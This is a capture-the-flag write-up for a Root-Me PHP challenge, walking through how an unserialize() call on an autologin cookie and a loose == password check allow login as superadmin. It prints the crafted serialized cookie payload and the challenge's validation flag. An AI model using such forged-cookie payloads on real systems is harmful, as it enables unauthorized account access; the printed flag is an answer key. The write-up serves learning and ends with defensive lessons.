## Challenge name: PHP - Serialization


<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/092b57b4-3400-46ee-ba4d-454d1567c9e2" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization](https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization)
<br>
<br>

**After starting the challenge, we are presented with a login page. We can log in as `guest`, but this account has restricted access.  
The PHP source code of the application is also provided, which is a strong indicator that the vulnerability lies in the application logic rather than brute force or enumeration.**

<br>
<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/f7dbdfb4-e1ba-4ab8-bffc-ba36e4e0a0f4" />
<br>
<br>

**At this point, basic PHP and programming knowledge is required to understand how authentication is handled internally.  
By reviewing the source code, we can start identifying potential security issues.**

<br>
<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/79ffce7e-c506-4e32-b723-c007943e4361" />
<br>
<br>

**After successfully logging in as `guest`, we enter a restricted area.  
A cookie is set to maintain the session, allowing automatic login on page refresh.  
Looking closely at the source code, we notice the presence of an `autologin` cookie, which immediately raises a red flag.**

**Let’s inspect the relevant code:**

```
        // autologin cookie ?
        else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
```

<br>

**Here, user-controlled cookie data is passed directly to `unserialize()`, which is already a dangerous practice.  
The comment in the source code tells us that the cookie should contain a serialized associative array holding the user’s login and password.**

<br>

**Later, this data is validated using the following password check:**

```
    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
```

<br>

**This is the core vulnerability.  
The comparison uses PHP’s loose comparison operator `==` instead of the strict operator `===`.  
Loose comparison performs type juggling, meaning PHP will automatically convert values to compatible types before comparing them.**

<br>

**The goal is therefore not to know the real password, but to supply a value that evaluates as equal after type juggling.  
We can safely assume that `$auth[$data['login']]` contains a string, but its exact value is unknown.**

<br>

**To exploit this, we analyze how PHP compares booleans and strings using `==`.  
The following examples demonstrate this behavior:**


```
    $ php -a
    Interactive shell 
    php > var_dump((bool) "");   // false because empty string if non-empty string then true..
    bool(false)
    php > var_dump((bool) "0");  // 0 is false in programming and php is a dynamic lang so if a var has 0 its bool and its false..
    bool(false)
    php > var_dump((bool) "0a"); // non-empty string cuz there a also not only 0..
    bool(true)
    php > var_dump((bool) "adsfkljaldsf"); // true cuz non empty string..
    bool(true)
    php > var_dump(True == "");  // false cuz empty sting..                     
    bool(false)
    php > var_dump(True == "0"); // True is not equal to false cuz 0 is false..
    bool(false)
    php > var_dump(True == "0a"); // True is equal to 0a with is true cuz its non empty string..
    bool(true)
    php > var_dump(True == "adsfkljaldsf"); // True is equal to adsfkljaldsf with is true cuz its non empty string..
    bool(true)
    php >

```

<br>

**From this behavior, we learn that any non-empty, non-"0" string evaluates to `true` in a loose comparison.  
Therefore, if we set the password value to the boolean `True`, the comparison will succeed regardless of the actual password string stored in `$auth`.**

<br>

**Next, we craft a serialized array containing:**
- **login:** `superadmin`
- **password:** boolean `True`

**We generate and URL-encode the serialized payload:**

```
    $ php -a
    Interactive shell
     
    php > $data = array('login' => 'superadmin', 'password' => True);
    php > echo serialize($data);                                                                          
    a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
    php > echo urlencode(serialize($data));
    a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
    php >
```

<br>

**We replace the value of the `autologin` cookie with the following payload and refresh the page:**

`a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D`

<br>
<img width="2020" height="1289" alt="image" src="https://github.com/user-attachments/assets/8151ee4b-3e28-43e5-9258-4a3bba60b4a3" />
<br>
<br>

**After refreshing the page, the authentication check passes and we are logged in as `superadmin`.**

<br>
<img width="1392" height="316" alt="image" src="https://github.com/user-attachments/assets/9ccde3fa-b8a6-45ec-b745-20ec1222dad9" />
<br>
<br>

**Key takeaways from this challenge:**
- **Never use loose comparison (`==`) for authentication logic**
- **Never pass user-controlled data to `unserialize()`**
- **Type juggling vulnerabilities can completely bypass authentications**

<br>

**Challenge validation flag/password:**  
**`NoUserInputInPHPSerialization`**

<br>

**Thank you.**
